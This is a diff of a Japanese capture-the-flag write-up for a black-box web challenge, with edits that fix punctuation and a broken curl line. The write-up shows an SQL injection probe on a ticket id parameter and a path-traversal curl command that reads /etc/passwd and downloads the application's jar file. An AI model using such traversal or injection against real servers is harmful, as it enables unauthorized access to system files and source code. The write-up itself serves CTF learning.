@@ -15,14 +15,14 @@ URLだけが渡されるので、ブラックボックスで解けというこ�
 送信すると、チケットが開かれる。  
 ![site2.png](site/site2.png)  
 チケットのURLは`http://34.89.179.154:30926/ticket?id=51`であった。  
-`id`に何かあるのでは思い。`'`を入れると以下のエラーが発生した。  
+`id`に何かあるのではと思い、`'`を入れると以下のエラーが発生した。  
 ```
 Error: [SQLITE_ERROR] SQL error or missing database (unrecognized token: "'")
 ```
 SQLiが自明にあるので、テーブルをダンプしてみるが`tickets`のみであった。  
 初めから右上の`Tickets`のリンク先である`http://34.89.179.154:30926/tickets?user=admin`で他人のチケットも閲覧できるため、特に情報量は増えていない。  
 次に、チケットに添付したファイルが`http://34.89.179.154:30926/download?id=51`でDLできるらしいが、機能的に壊れている。  
-この`id`にも何かあるのではと思い`../../../../../etc/passwd`を指定するとファイルが降ってきた。  
+この`id`にも何かあるのではと思い、`../../../../../etc/passwd`を指定するとファイルが降ってきた。  
 ```bash
 $ curl 'http://34.89.179.154:30926/download?id=../../../../../etc/passwd'
 root:x:0:0:root:/root:/bin/ash
@@ -41,8 +41,7 @@ java
 ```
 `/app/target/jargon.jar`のようなので、取得して展開する。  
 ```bash
-$ curl -s 'http://34.89.179.154:30926/download?id=../../../../../app/tar
-get/jargon.jar' -o jargon.jar
+$ curl -s 'http://34.89.179.154:30926/download?id=../../../../../app/target/jargon.jar' -o jargon.jar
 $ unzip jargon.jar -d extracted
 Archive:  jargon.jar
 ~~~
